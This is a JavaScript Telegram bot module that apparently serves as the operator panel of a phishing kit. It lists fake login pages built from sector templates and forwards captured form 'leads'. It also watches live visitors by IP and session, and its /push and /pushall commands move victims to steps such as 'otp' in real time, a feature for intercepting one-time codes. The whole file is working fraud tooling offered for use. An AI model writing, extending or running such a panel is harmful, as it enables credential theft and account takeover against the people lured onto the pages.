import { Telegraf } from 'telegraf';
import db from './db.js';
import { getTemplate, getCategories, TEMPLATES } from './templates.js';

const token = process.env.BOT_TOKEN;
export const bot = (token && token !== 'test_bot_token_here') ? new Telegraf(token) : null;

if (bot) {
  bot.start(async ctx => {
    try {
      await ctx.reply('أهلاً 👋\n\nالأوامر:\n/pages — الصفحات\n/templates — القوالب\n/stats — إحصائيات\n/leads — الليدز');
    } catch (err) {
      console.error('start command error:', err.message);
    }
  });

  bot.command('pages', async ctx => {
    try {
      const rows = db.prepare('SELECT id, slug, title, views FROM pages ORDER BY id DESC LIMIT 10').all();
      if (!rows.length) return ctx.reply('مفيش صفحات لسه.');
      const base = process.env.BASE_URL || '';
      ctx.reply(rows.map(p => `#${p.id} ${p.title}\n${base}/p/${p.slug}/login\n👁 ${p.views}`).join('\n\n'));
    } catch (err) {
      console.error('pages command error:', err.message);
      ctx.reply('❌ خطأ في تحميل الصفحات');
    }
  });

  bot.command('templates', async ctx => {
    try {
      const rows = getCategories().map(c => [{ text: `${c.name} (${c.count})`, callback_data: `cat_${c.id}` }]);
      ctx.reply('🎨 اختار قطاع:', { reply_markup: { inline_keyboard: rows } });
    } catch (err) {
      console.error('templates command error:', err.message);
    }
  });

  bot.action(/^cat_(.+)$/, async ctx => {
    try {
      const cat = ctx.match[1];
      const list = TEMPLATES.filter(t => t.category === cat);
      const chunks = [];
      for (let i = 0; i < list.length; i += 3) {
        chunks.push(list.slice(i, i + 3).map(t => [{ text: `${t.name}`, callback_data: `pick_${t.id}` }]));
      }
      ctx.editMessageText(`📁 ${cat}: `, { reply_markup: { inline_keyboard: chunks.flat() } }).catch(() => {});
    } catch (err) {
      console.error('action cat_ error:', err.message);
    }
  });

  bot.command('stats', async ctx => {
    try {
      const pages = db.prepare('SELECT COUNT(*) c FROM pages').get().c;
      const leads = db.prepare('SELECT COUNT(*) c FROM leads').get().c;
      const views = db.prepare('SELECT COALESCE(SUM(views),0) v FROM pages').get().v;
      ctx.reply(`📊 إحصائيات\n\nصفحات: ${pages}\nمشاهدات: ${views}\nليدز: ${leads}`);
    } catch (err) {
      console.error('stats command error:', err.message);
      ctx.reply('❌ خطأ');
    }
  });

  bot.command('leads', async ctx => {
    try {
      const rows = db.prepare('SELECT l.*, p.title FROM leads l JOIN pages p ON p.id = l.page_id ORDER BY l.id DESC LIMIT 5').all();
      if (!rows.length) return ctx.reply('مفيش ليدز لسه.');
      ctx.reply(rows.map(l => {
        const d = JSON.parse(l.data);
        const body = Object.entries(d).map(([k, v]) => `${k}: ${v}`).join('\n');
        return `📩 ${l.title}\n${body}`;
      }).join('\n\n'));
    } catch (err) {
      console.error('leads command error:', err.message);
      ctx.reply('❌ خطأ');
    }
  });

  // ── Live visitor control commands ──────────────────────────
  bot.command('live', async ctx => {
    try {
      const cutoff = new Date(Date.now() - 10*60*1000).toISOString();
      const visitors = db.prepare('SELECT * FROM visitors WHERE last_seen > ? ORDER BY last_seen DESC').all(cutoff);
      if (!visitors.length) return ctx.reply('🔴 No active visitors right now.');
      const lines = visitors.map((v, i) =>
        `${i+1}. 📍 <b>${v.page_title || 'Page'}</b>\n   Step: <code>${v.current_step}</code>\n   IP: ${v.ip}\n   SID: <code>${v.session_id}</code>`
      ).join('\n\n');
      ctx.reply(`👥 Active Visitors (${visitors.length}):\n\n${lines}\n\nUse /push SID STEP`, { parse_mode: 'HTML' });
    } catch (err) { ctx.reply('❌ Error'); }
  });

  bot.command('push', async ctx => {
    try {
      const parts = ctx.message.text.trim().split(/\s+/);
      if (parts.length < 3) return ctx.reply('Usage: /push SID STEP\nExample: /push abc123 otp\nSpecial: HOME or NEXT');
      const [, sid, step] = parts;
      const v = db.prepare('SELECT * FROM visitors WHERE session_id=?').get(sid);
      if (!v) return ctx.reply('❌ Session not found or expired.');
      db.prepare(`UPDATE visitors SET pending_step=? WHERE session_id=?`).run(step, sid);
      ctx.reply(`✅ Pushed <code>${step}</code> to visitor on <b>${v.page_title}</b>`, { parse_mode: 'HTML' });
    } catch (err) { ctx.reply('❌ Error: ' + err.message); }
  });

  bot.command('pushall', async ctx => {
    try {
      const parts = ctx.message.text.trim().split(/\s+/);
      if (parts.length < 2) return ctx.reply('Usage: /pushall STEP\nExample: /pushall otp');
      const step = parts[1];
      const cutoff = new Date(Date.now() - 10*60*1000).toISOString();
      const result = db.prepare(`UPDATE visitors SET pending_step=? WHERE last_seen > ?`).run(step, cutoff);
      ctx.reply(`✅ Pushed <code>${step}</code> to ${result.changes} active visitor(s)`, { parse_mode: 'HTML' });
    } catch (err) { ctx.reply('❌ Error: ' + err.message); }
  });

  // Inline button: push_SID_STEP — sent from notification message buttons
  bot.action(/^push_(.+)_([^_]+)$/, async ctx => {
    try {
      // sid may contain underscores — take last segment as step, rest as sid
      const raw = ctx.match[0].replace(/^push_/, '');
      const lastUnderscore = raw.lastIndexOf('_');
      const sid = raw.slice(0, lastUnderscore);
      const step = raw.slice(lastUnderscore + 1);
      if (!sid) {
        await ctx.answerCbQuery('❌ No session ID', { show_alert: true });
        return;
      }
      const v = db.prepare('SELECT * FROM visitors WHERE session_id=?').get(sid);
      if (!v) {
        await ctx.answerCbQuery('⚠️ Session expired or not found', { show_alert: true });
        return;
      }
      db.prepare(`UPDATE visitors SET pending_step=? WHERE session_id=?`).run(step, sid);
      await ctx.answerCbQuery(`✅ Pushed: ${step}`);
      // Edit message to show which step was chosen
      const stepLabel = step === 'HOME' ? '🏠 Home' : step === 'complete' ? '✅ Complete' : `➡️ ${step}`;
      await ctx.editMessageText(
        ctx.callbackQuery.message.text + `\n\n⚡ <b>Pushed:</b> ${stepLabel}`,
        { parse_mode: 'HTML' }
      ).catch(() => {});
    } catch (err) {
      await ctx.answerCbQuery('❌ Error: ' + err.message, { show_alert: true });
    }
  });

  bot.catch((err, ctx) => {
    console.error('Bot error:', err.message);
  });
}

export async function notify(text, extra = {}) {
  if (!bot || !process.env.ADMIN_CHAT_ID || process.env.ADMIN_CHAT_ID === '123456789') return;
  try {
    await bot.telegram.sendMessage(process.env.ADMIN_CHAT_ID, text, { parse_mode: 'HTML', ...extra });
  } catch (e) {
    console.error('notify failed:', e.message);
  }
}
